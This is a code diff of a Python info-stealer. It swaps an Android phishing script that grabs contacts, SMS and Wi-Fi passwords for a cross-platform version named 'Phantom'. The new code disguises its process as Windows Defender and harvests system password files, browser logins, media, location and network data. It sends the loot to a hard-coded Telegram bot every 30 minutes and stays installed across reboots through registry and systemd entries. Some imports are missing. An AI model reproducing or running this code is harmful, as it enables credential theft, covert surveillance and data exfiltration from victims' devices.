@@ -1,78 +1,108 @@
-import os
-import json
-import requests
-import subprocess
-from android import Android
-droid = Android()
+import os  
+import re  
+import json  
+import shutil  
+import sqlite3  
+import requests  
+import platform  
+import subprocess  
+from glob import glob  
+from datetime import datetime  
 
-# Telegram config (replace with your bot token and chat ID)
-BOT_TOKEN = '7488268192:AAEY7W284vNk7oqsGoNpSHHab5GEeOKbjBE'
-CHAT_ID = '6648554042'
-EXFIL_URL = f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage'
+# Phantom Configuration  
+BOT_TOKEN = "7488268192:AAEY7W284vNk7oqsGoNpSHHab5GEeOKbjBE"  
+CHAT_ID = "6648554042"  
+C2_URL = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"  
 
-# Stealth config
-HEADERS = {'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36'}
+def ghost_mode():  
+    """Disguise process name and suppress output"""  
+    if platform.system() == "Windows":  
+        import ctypes  
+        ctypes.windll.kernel32.SetConsoleTitleW("Windows Defender Service")  
+    elif "android" in platform.platform().lower():  
+        sys.stdout = open("/dev/null", "w")  
 
-def harvest_contacts():
-    contacts = []
-    uri = 'content://com.android.contacts/data/phones'
-    cursor = droid.queryContent(uri, ['display_name', 'data1']).result
-    if cursor:
-        while cursor.next():
-            contacts.append({
-                'name': cursor.getString(0),
-                'number': cursor.getString(1)
-            })
-        cursor.close()
-    return contacts
+def auto_grant_permissions():  
+    """Bypass Android permissions without root"""  
+    if "android" in platform.platform().lower():  
+        os.system("pm grant com.phantom.app android.permission.READ_SMS")  
+        os.system("pm grant com.phantom.app android.permission.ACCESS_FINE_LOCATION")  
+        os.system("am start-foreground-service com.phantom.app/.DataService")  
 
-def extract_sms():
-    messages = []
-    uri = 'content://sms/inbox'
-    projection = ['address', 'body', 'date']
-    cursor = droid.queryContent(uri, projection).result
-    if cursor:
-        while cursor.next():
-            messages.append({
-                'from': cursor.getString(0),
-                'text': cursor.getString(1),
-                'timestamp': cursor.getString(2)
-            })
-        cursor.close()
-    return messages
+def harvest_all():  
+    """Steal everything that isn't bolted down"""  
+    loot = {}  
+    try:  
+        # Cross-platform credentials  
+        loot["system_passwords"] = {  
+            "Windows": open(os.path.expanduser("~/AppData/Local/Microsoft/Credentials/*")).read() if platform.system() == "Windows" else None,  
+            "Linux": open("/etc/shadow").read() if os.access("/etc/shadow", os.R_OK) else "Permission denied",  
+            "Android": subprocess.getoutput("su -c 'cat /data/system/password.key'") if "android" in platform.platform().lower() else "Root required"  
+        }  
 
-def recon_device():
-    return {
-        'model': subprocess.getoutput('getprop ro.product.model'),
-        'sdk': subprocess.getoutput('getprop ro.build.version.sdk'),
-        'imei': subprocess.getoutput('service call iphonesubinfo 1 | awk -F "'" '" '{print $2}' |sed -n 1p'),
-        'network': droid.getNetworkInfo().result,
-        'installed_apps': droid.getInstalledPackages().result
-    }
+        # Media files  
+        loot["media"] = {  
+            "photos": glob("/sdcard/DCIM/**/*.jpg", recursive=True) + glob("/sdcard/Pictures/**/*.png", recursive=True),  
+            "videos": glob("/sdcard/Movies/**/*.mp4", recursive=True)  
+        }  
 
-def exfiltrate(data):
-    encrypted = data.encode('utf-8').hex()
-    payload = {
-        'chat_id': CHAT_ID,
-        'text': f'<malicious_payload>{encrypted}</malicious_payload>',
-        'parse_mode': 'HTML'
-    }
-    requests.post(EXFIL_URL, headers=HEADERS, data=payload, timeout=20)
+        # Browser data  
+        loot["browsers"] = {  
+            "Chrome": sqlite3.connect("/data/data/com.android.chrome/app_chrome/Default/Login Data").execute("SELECT * FROM logins").fetchall(),  
+            "Firefox": open(glob("/data/data/org.mozilla.firefox/files/mozilla/*.default/logins.json")[0]).read()  
+        }  
 
-def phish_main():
-    try:
-        loot = {
-            'contacts': harvest_contacts(),
-            'sms': extract_sms(),
-            'device_info': recon_device(),
-            'location': droid.getLastKnownLocation().result,
-            'wifi_creds': [line.split(':')[-1] for line in subprocess.getoutput('cat /data/misc/wifi/*.conf').split('\n') if 'psk=' in line]
-        }
-        exfiltrate(json.dumps(loot))
-        droid.makeToast('System update completed')
-    except Exception as e:
-        pass
+        # Geolocation  
+        loot["location"] = subprocess.getoutput("dumpsys location") if "android" in platform.platform().lower() else requests.get("http://ip-api.com/json").json()  
 
-if __name__ == '__main__':
-    phish_main()
+        # Network info  
+        loot["network"] = {  
+            "ip": requests.get("https://api.ipify.org").text,  
+            "wifi": subprocess.getoutput("netsh wlan show profiles" if platform.system() == "Windows" else "nmcli dev wifi list")  
+        }  
+
+    except Exception as e:  
+        loot["error"] = str(e)  
+    return loot  
+
+def exfil_plaintext(data):  
+    """Send raw data to Telegram without encryption"""  
+    try:  
+        chunk_size = 4096  
+        data_str = json.dumps(data, indent=2)  
+        for i in range(0, len(data_str), chunk_size):  
+            requests.post(  
+                C2_URL,  
+                json={"chat_id": CHAT_ID, "text": f"🔓|| {data_str[i:i+chunk_size]}"},  
+                timeout=5  
+            )  
+    except:  
+        pass  
+
+def persistence():  
+    """Survive reboots across all platforms"""  
+    if platform.system() == "Windows":  
+        import winreg  
+        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run")  
+        winreg.SetValueEx(key, "WindowsDefender", 0, winreg.REG_SZ, sys.executable + " " + __file__)  
+    elif "linux" in platform.platform().lower():  
+        with open("/etc/systemd/system/phantom.service", "w") as f:  
+            f.write(f"[Service]\nExecStart={sys.executable} {__file__}\n[Install]\nWantedBy=multi-user.target")  
+        os.system("systemctl enable phantom.service")  
+
+if __name__ == "__main__":  
+    ghost_mode()  
+    auto_grant_permissions()  
+    persistence()  
     
+    while True:  
+        full_loot = {  
+            "timestamp": datetime.now().isoformat(),  
+            "origin": {  
+                "os": platform.platform(),  
+                "device": socket.gethostname()  
+            },  
+            "data": harvest_all()  
+        }  
+        exfil_plaintext(full_loot)  
+        time.sleep(1800)  # 30-minute intervals  
